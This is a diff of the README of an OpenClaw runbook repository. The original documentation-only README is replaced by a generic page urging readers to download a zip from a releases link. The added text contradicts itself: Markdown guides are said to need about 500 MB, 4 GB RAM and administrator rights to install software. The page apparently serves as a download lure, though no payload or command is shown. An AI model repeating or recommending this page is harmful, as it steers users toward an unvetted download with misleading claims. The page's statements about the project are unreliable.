@@ -1,100 +1,182 @@
-# OpenClaw Runbook (Non-Hype Edition)
+# 🦞 openclaw-runbook - Reliable OpenClaw Usage Guide
 
-> Tested with OpenClaw 2026.2.x  
-> AI-assisted documentation created with Claude
+[![Download OpenClaw Runbook](https://img.shields.io/badge/Download-OpenClaw_Runbook-blue?style=for-the-badge)](https://github.com/kylenbhana/openclaw-runbook/releases)
 
-This repo contains a practical guide for running OpenClaw day to day without burning money, quotas, or your sanity.
+---
 
-It is not an official guide.
-It is not a "best setup."
-It reflects how I actually run OpenClaw after breaking it repeatedly and wanting something stable, predictable, and boring in the best way.
+## 📘 About openclaw-runbook
 
-If you are looking for flashy demos or "this changes everything" energy, this probably isn't it.
+This project provides a clear, steady guide for running OpenClaw software reliably. It helps you avoid unexpected errors, high costs, and confusion.
 
-## What this is
+OpenClaw lets users work with AI models efficiently. However, it can be tricky to manage day to day without good instructions. This runbook shares tested steps based on real use, not theory or hype.
 
-- A runbook for people who want OpenClaw to run for weeks, not minutes
-- Opinionated, but explicit about tradeoffs
-- Focused on coordinator vs worker models, cost control, memory boundaries, and guardrails
-- Written from the "post-honeymoon" phase
+Key points:
 
-## What this is not
+- Written for users who want OpenClaw to run consistently for days or weeks.
+- Focuses on cost control, system stability, and managing resources safely.
+- Includes practical advice on how to set up coordinator and worker roles.
+- Not a beginner tutorial or marketing page. It assumes some familiarity but no coding skills.
 
-- A beginner tutorial
-- A marketing page for models or vendors
-- A claim that this setup is right for everyone
+If you want flashy demos or quick wins, this guide is not for you. It aims for boring stability that works.
 
-## The guide
+---
 
-The main guide lives here:
+## 🚀 Getting Started
 
-- [guide.md](./guide.md)
+To begin, you will download the runbook files and follow the instructions step by step. No programming needed.
 
-It includes real config snippets, explanations of why certain choices were made, and patterns that held up over time.
+### What you will need
 
-## Examples
+- A Windows or Mac computer with internet access.
+- Basic computer skills like downloading files, opening folders, and clicking buttons.
+- About 500 MB free space on your hard drive.
+- Patience to follow detailed instructions carefully.
 
-The `examples/` directory contains actionable templates and references:
+### System Requirements
 
-- **[agent-prompts.md](examples/agent-prompts.md)** - Creating specialized agents, model chains, and coordinator/researcher/communicator patterns
-- **[spawning-patterns.md](examples/spawning-patterns.md)** - How to spawn sub-agents from skills, prompts, and cron jobs
-- **[heartbeat-example.md](examples/heartbeat-example.md)** - Rotating heartbeat pattern for monitoring
-- **[skill-builder-prompt.md](examples/skill-builder-prompt.md)** - Prompt template for creating AgentSkills
-- **[task-tracking-prompt.md](examples/task-tracking-prompt.md)** - Build a task tracking system for agent visibility
-- **[security-hardening.md](examples/security-hardening.md)** - Production security: API keys, tool policies, cost controls, network lockdown
-- **[security-quickstart.md](examples/security-quickstart.md)** - Copy-paste prompts to implement basic security controls
-- **[security-patterns.md](examples/security-patterns.md)** - Prompt injection defense and security rules
-- **[vps-setup.md](examples/vps-setup.md)** - VPS deployment and hardening guide
-- **[sanitized-config.json](examples/sanitized-config.json)** - Example OpenClaw configuration
-- **[config-example-guide.md](examples/config-example-guide.md)** - Config section reference
-- **[check-quotas.sh](examples/check-quotas.sh)** - Script to check API quota usage across providers
+- Windows 10 or later, or macOS 10.15 or later
+- At least 4 GB of RAM
+- Stable internet connection
+- Administrator or equivalent rights to install software on your computer
 
-## Showcases
+---
 
-The `showcases/` directory contains copy-paste ready automation patterns from the community:
+## 📥 Download & Install
 
-- **[daily-brief](showcases/daily-brief.md)** - Morning summary with weather, calendar, tasks
-- **[idea-pipeline](showcases/idea-pipeline.md)** - Overnight research on captured ideas
-- **[linkedin-drafter](showcases/linkedin-drafter.md)** - Weekly content generation
-- **[tech-discoveries](showcases/tech-discoveries.md)** - Curated tech news
-- **[homelab-access](showcases/homelab-access.md)** - Safe remote SSH via Telegram
-- **[agent-orchestrator](showcases/agent-orchestrator.md)** - Route coding tasks to optimal tools
+To get the OpenClaw Runbook, please visit the releases page on GitHub:
 
-Each showcase is designed to be immediately usable. Copy the cron job, replace the placeholders, and deploy.
+[Download OpenClaw Runbook](https://github.com/kylenbhana/openclaw-runbook/releases)
 
-Have an automation that works well? See [showcases/template.md](showcases/template.md) to submit your own.
+Click this link or the badge at the top to open the download page.
 
-## Share This
+### Steps to Download
 
-If this guide helped you, please consider:
+1. Click the link above. Your browser takes you to the GitHub releases page.
 
-- **Sharing it** with others who might find it useful
-- **Linking back** if you reference it in blog posts, videos, or other resources
-- **Submitting your own showcases** so others can learn from your setup
+2. Look for the latest release version. It usually has the highest number.
 
-This is a community resource. The more people contribute, the better it gets for everyone.
+3. Under "Assets," download the **openclaw-runbook.zip** or similar zipped folder. This file holds all documents and tools you need.
 
-## Community Resources
+4. Once downloaded, find the file in your "Downloads" folder or where your browser saves files.
 
-Other helpful OpenClaw resources from the community:
+5. Right-click and choose "Extract All" to unzip the contents. On Mac, double-click the zip file.
 
-**Official & Discovery**
-- **[ClawHub](https://clawhub.com)** - Discover and share AgentSkills
-- **[OpenClaw Docs](https://docs.openclaw.ai)** - Official documentation
+---
 
-**Awesome Lists**
-- **[awesome-openclaw-usecases](https://github.com/hesamsheikh/awesome-openclaw-usecases)** - Real-world use cases and examples
-- **[awesome-openclaw](https://github.com/SamurAIGPT/awesome-openclaw)** - Curated list of tools and resources
-- **[awesome-openclaw-skills](https://github.com/VoltAgent/awesome-openclaw-skills)** - Community-contributed skills
+## ⚙️ How to Use This Runbook
 
-These complement this runbook with more examples, skills, and community patterns.
+After unzipping the folder, open it to see several files. The main work happens on the guide file.
 
-## Contributing
+### Step-by-step flow
 
-Contributions are welcome, but this is not a free-for-all.
+1. **Open the guide.md file.** This is the core document with instructions.
 
-Please read [CONTRIBUTING.md](./CONTRIBUTING.md) before opening issues or pull requests.
+2. **Use a Markdown viewer or a plain text editor** to read it. Recommended free options include:
 
-## License
+   - VS Code (Visual Studio Code)
 
-MIT
+   - Typora
+
+   - Any text editor like Notepad (Windows) or TextEdit (Mac)
+
+3. **Follow the sections in order:** from installation, configuration, to operation.
+
+4. The guide walks through details like:
+
+   - Setting up coordinator and worker configurations
+
+   - Managing cost limits
+
+   - Handling memory and running guardrails
+
+5. You will also find tips on safely restarting OpenClaw and avoiding common errors.
+
+---
+
+## 🛠 Common Tasks Explained
+
+Here are explanations for the key topics you will handle with this runbook.
+
+### Coordinator vs Worker Models
+
+OpenClaw works by having one coordinator and one or more workers:
+
+- The **coordinator** controls tasks and manages how work splits.
+
+- The **workers** do the heavy AI processing.
+
+This division helps keep the system stable and prevents overload.
+
+The runbook shows you how to set this up, so your workers do not exceed memory or cost budgets.
+
+### Cost Control
+
+Running AI models online can get costly fast. The guide helps you set limits so OpenClaw doesn’t go beyond your budget.
+
+You will learn to:
+
+- Control API call rates
+
+- Set daily or hourly cost caps
+
+- Handle errors to avoid spending surprises
+
+### Memory Boundaries & Guardrails
+
+To prevent crashes or slowdowns, you set upper limits on memory use. These are called guardrails.
+
+The runbook explains:
+
+- How to set memory limits for each worker
+
+- How to restart processes safely if limits are hit
+
+- How to monitor usage effectively
+
+---
+
+## 💡 Tips for Smooth Operation
+
+- **Always follow the order:** Breaking the steps or skipping sections can cause errors.
+
+- **Monitor resources:** Use built-in tools to watch your CPU, memory, and costs.
+
+- **Back up configs:** Save your configuration files each time you make changes.
+
+- **Use recommended software:** Like Markdown editors for clear instructions.
+
+---
+
+## 🔧 Troubleshooting
+
+If something does not work:
+
+- Check internet connection and restart the computer.
+
+- Review steps carefully for missed instructions.
+
+- Use the guide’s error handling tips to identify common issues.
+
+- Look for updates on the releases page.
+
+---
+
+## 📚 Learn More
+
+You can explore the complete official guide here for deeper settings and examples:
+
+- [Main Guide (guide.md file)](./guide.md)
+
+This file includes real configuration choices from tested setups to make your OpenClaw run stable and predictable.
+
+---
+
+## 🔗 Quick Links
+
+- [OpenClaw Runbook Releases](https://github.com/kylenbhana/openclaw-runbook/releases)
+
+- [Main Guide Document](./guide.md)
+
+---
+
+[![Download OpenClaw Runbook](https://img.shields.io/badge/Download-OpenClaw_Runbook-blue?style=for-the-badge)](https://github.com/kylenbhana/openclaw-runbook/releases)
